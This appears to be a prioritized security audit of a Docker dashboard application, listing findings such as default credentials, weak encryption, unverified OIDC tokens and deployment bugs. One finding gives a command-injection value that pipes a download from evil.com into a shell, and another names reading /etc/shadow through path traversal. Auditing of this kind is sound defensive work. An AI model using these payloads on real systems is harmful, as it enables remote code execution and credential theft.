## P0 â€” Sale-killers

### 1. Default admin password is `admin`, `must_change_password` is metadata-only
- Files: `src/services/auth.js:14-23`, `.env.example:17`, `src/routes/auth.js:43-67`, `src/server.js:214`
- Login still returns a working session token even when `mustChangePassword: true`. Production guard only `log.warn`s. Scripted attacker on a fresh deploy gets full admin via `admin/admin` before the human ever logs in.

### 2. `ENCRYPTION_KEY` falls back to literal string `"fallback-key"` outside production
- Files: `src/utils/crypto.js:14-22`, `src/server.js:204-209`
- `_getKey()` returns `'fallback-key'` if env unset and `APP_ENV !== production`. Every secret in `secrets_vault`, every TOTP seed, every recovery code is encrypted with a publicly-knowable constant for staging/dev/test deploys.

### 3. SSH passwords + private keys stored as PLAINTEXT JSON in DB
- Files: `src/routes/hosts.js:127-135,187-200`, `src/services/ssh-tunnel.js:41-45`
- `JSON.stringify({password, privateKey, passphrase})` straight into `docker_hosts.ssh_config`. Anyone who steals `docker-dash.db` (see #5) gets keys to every connected host.

### 4. Registry credentials use XOR "encryption" with TODO comment in source
- Files: `src/services/registry.js:84-109`
- Comment: *"(for simplicity; a real app would use AES)"*. Falls back to plain base64 on missing key. Trivially broken given a few known plaintexts.

### 5. `POST /api/database/restore` accepts any uploaded SQLite, wipes audit trail
- Files: `src/routes/misc.js:320-362`
- `auditService.log` runs against the OLD db, so the new DB never sees the restore entry. No checksum, no signature, no max size. One popped admin = perfect crime.

### 6. `POST /api/system/secrets-wizard/deploy-remote` runs arbitrary bash as root, audits only `outputLen`
- Files: `src/routes/system.js:1885-1966`
- Global admin = root on every connected host. No per-host RBAC, no signed scripts, no script hash in audit trail. Cannot prove what ran later.

### 7. Certificate Manager / CSR / parsePem doesn't work â€” `openssl` missing from runtime image
- Files: `src/services/certificates.js:20,83-89`, `Dockerfile:8`
- Dockerfile installs `tini wget curl docker-cli gcompat git openssh-client` only. Flagship v6.3 feature returns ENOENT on every call. Daily 07:30 cron silently fails forever.

### 8. README "Manual Install" path crashes container on first boot
- Files: `.env.example:9-11,45`, `src/server.js:196-213`
- Ships `APP_SECRET=generate-a-random-string-here`, `ENCRYPTION_KEY=change-me-...`, `APP_ENV=production`. README says `cp .env.example .env && docker compose up -d`. Server logs FATAL and exits. Restart loop.

### 9. `docker-compose.override.yml` committed to repo, silently downgrades to dev mode
- Files: `docker-compose.override.yml`
- Compose loads override files automatically. Every git-clone customer gets `target: development`, source mounted from host, `node --watch`.

### 10. `--profile tls up -d` (documented HTTPS path) crashes Caddy on first start
- Files: `docker-compose.yml:53`, `src/services/ssl.js:62-66`
- Caddy starts with `--config /data/certs/Caddyfile` but the volume is empty until the user opens the SSL UI â€” which requires Caddy already running. Chicken-and-egg.

## P1 â€” Serious

### 11. OIDC ID token signature NOT verified
- Files: `src/routes/auth.js:518-526,491`
- `_decodeJwtPayload` decodes JWT and trusts it. No JWKS, no `iss`/`aud` check, no expiry. `_oidcFetch` allows `http://` discovery URLs. With `OIDC_DEFAULT_ROLE=admin`, MITM = admin.

### 12. SSO header trust is unauthenticated
- Files: `src/middleware/auth.js:38-51`, `src/services/auth.js:397-411`
- With `ENABLE_SSO_HEADERS=true`, any request with `X-Forwarded-User` + `X-Forwarded-Groups: admin` becomes admin, auto-provisioned. No shared-secret, no IP allow-list.

### 13. Command injection via SSH host config `dockerSocket`
- Files: `src/services/ssh-tunnel.js:142-144,173,182,229`
- `socat STDIO UNIX-CONNECT:${remoteSocketPath}` â€” admin sets `dockerSocket: '/var/run/docker.sock; curl evil.com/x | sh'` â†’ RCE on SSH host. Backup-import attack vector.

### 14. Path traversal via certificate `sourcePath` â€” admin reads any host file daily
- Files: `src/routes/system.js:2024-2028`, `src/jobs/index.js:200-202`
- Pass `sourcePath: '/etc/shadow'` or `/proc/self/environ`. Cron re-reads nightly. No allow-list, no chroot, no normalization.

### 15. Three different version strings
- Files: `README.md:12,28` (6.2.0), `package.json:3` (6.3.0), `package-lock.json:3,9` (6.1.0)
- Lockfile drift â€” `npm install` never re-run. Reproducible build isn't.

### 16. `ldapjs@3.0.7` decommissioned by upstream
- Files: `package-lock.json:6085-6089`
- 9 sub-packages marked `"deprecated": "This package has been decomissioned"`. No security fixes coming. Kills LDAP enterprise sale.

### 17. README says "Forgot password? Contact administrator" but backend has full token reset
- Files: `public/index.html:42-44`, `src/routes/auth.js:422-482`
- Backend implements complete reset flow, frontend hides it.

### 18. Bcrypt user enumeration via login timing
- Files: `src/services/auth.js:98-110`
- Unknown user â†’ returns immediately. Known user â†’ `bcrypt.compare` (~250ms). Stopwatch-enumerable.

### 19. Just-shipped Secrets Lifecycle suite has zero test coverage
- Grep `__tests__/` for "certificate", "secret_rotation", "/csr" â†’ 0 matches.
- The headline v6.3 feature is unverified.

### 20. Migrations are one-way; no `down()`; no rollback story
- Files: `src/db/migrations/043_*.js`, `044_*.js`, `src/db/index.js:28-54`
- Customer rolls back to v6.2 â†’ `_migrations` table still says applied â†’ re-upgrade silently skips them.

### 21. `must_change_password` enforced by UI only
- Files: `src/routes/auth.js:43-67`
- Returns valid session token with `mustChangePassword: true`. Scripted attacker bypasses UI.

### 22. Audit log retention default 7 days â€” below all compliance baselines
- Files: `src/config/index.js:64`
- HIPAA 6yr, PCI 1yr, SOX 7yr. Hash chain is well-designed but pointless if cleanup truncates hourly.

### 23. CSRF: zero protection. Bearer accepted from any origin
- Files: `src/middleware/auth.js:13-15`, `src/server.js`
- No CSRF middleware, no CORS allow-list. XSS in another tab â†’ token usable from anywhere.

### 24. WebSocket: no Origin check, query-param token logged in plaintext
- Files: `src/ws/index.js:35-77`
- Malicious page can open `ws://victim/ws?token=<stolen>`. 100-msg/s rate is per-connection.

### 25. Bulk wizard re-run silently clobbers carefully tuned rotation intervals
- Files: `src/routes/secretsRotations.js:74-81`
- `ON CONFLICT DO UPDATE SET rotation_interval_days = excluded.*` â€” wrecks customizations.

### 26. `install.sh` references `ghcr.io/bogdanpricop/docker-dash:latest` (may not exist)
- Files: `install.sh:159`
- Primary one-line install dies with `pull access denied` if GHCR image missing/private.
